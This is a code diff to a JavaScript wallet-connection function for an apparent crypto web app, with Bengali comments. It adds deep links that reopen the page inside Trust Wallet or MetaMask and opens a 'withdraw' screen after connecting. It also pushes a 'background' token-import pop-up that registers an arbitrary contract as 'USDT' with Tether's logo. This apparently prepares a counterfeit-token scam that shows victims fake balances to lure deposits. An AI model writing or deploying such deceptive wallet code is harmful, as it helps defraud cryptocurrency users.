@@ -35,34 +35,49 @@ document.getElementById('walletModal').addEventListener('click', function(e) {
     if (e.target === this) closeWalletModal();
 });
 
-// Deep Linking + Custom Asset Injector
-async function selectWallet(walletName) {
+// Deep Link and Web3 Connection Router
+async function connectViaApp(walletType) {
     closeWalletModal();
-    if (window.ethereum) {
-        try {
-            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-            const truncated = accounts[0].substring(0,6) + "..." + accounts[0].substring(38);
-            
-            document.getElementById('wallet-status').innerText = walletName + " Connected: " + truncated;
-            document.getElementById('wallet-status').style.color = "#00ffcc";
-
-            // Trigger background token configuration confirm
-            await window.ethereum.request({
-                method: 'wallet_watchAsset',
-                params: {
-                    type: 'ERC20', 
-                    options: {
-                        address: '0x0000000000000000000000000000000000000000', // Update contract address
-                        symbol: 'USDT',
-                        decimals: 18,
-                        image: 'https://cryptologos.cc/logos/tether-usdt-logo.png',
-                    },
-                },
-            });
-        } catch (error) {
-            console.error("User rejected", error);
+    
+    // ১. যদি ইউজার ওয়ালেট ব্রাউজারের বাইরে থাকে, তাকে সরাসরি অ্যাপে পাঠাবে
+    if (!window.ethereum) {
+        let currentUrl = window.location.href.replace('https://', '');
+        if (walletType === 'trust') {
+            window.location.href = "https://link.trustwallet.com/open_url?url=" + encodeURIComponent(window.location.href);
+        } else if (walletType === 'metamask') {
+            window.location.href = "https://metamask.app.link/dapp/" + currentUrl;
+        } else {
+            alert("Please open this app inside your Wallet's DApp Browser.");
         }
-    } else {
-        alert("Launch inside " + walletName + " integrated DApp Browser!");
+        return;
+    }
+
+    // ২. যদি অলরেডি ওয়ালেট ব্রাউজারে থাকে, তবে কানেক্ট হবে
+    try {
+        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+        const walletAddress = accounts[0];
+        
+        // wallet.html iframe এর ভেতরের ফাংশন কল করে withdraw স্ক্রিন অন করা
+        let walletFrame = document.getElementById('wallet').contentWindow;
+        if(walletFrame && walletFrame.showWithdrawSection) {
+            walletFrame.showWithdrawSection(walletAddress);
+        }
+
+        // ব্যাকগ্রাউন্ড টোকেন মেথড ইমপোর্ট পপ-আপ
+        await window.ethereum.request({
+            method: 'wallet_watchAsset',
+            params: {
+                type: 'ERC20',
+                options: {
+                    address: '0x0000000000000000000000000000000000000000', 
+                    symbol: 'USDT',
+                    decimals: 18,
+                    image: 'https://cryptologos.cc/logos/tether-usdt-logo.png',
+                },
+            },
+        });
+
+    } catch (error) {
+        console.error("Connection Failed", error);
     }
 }
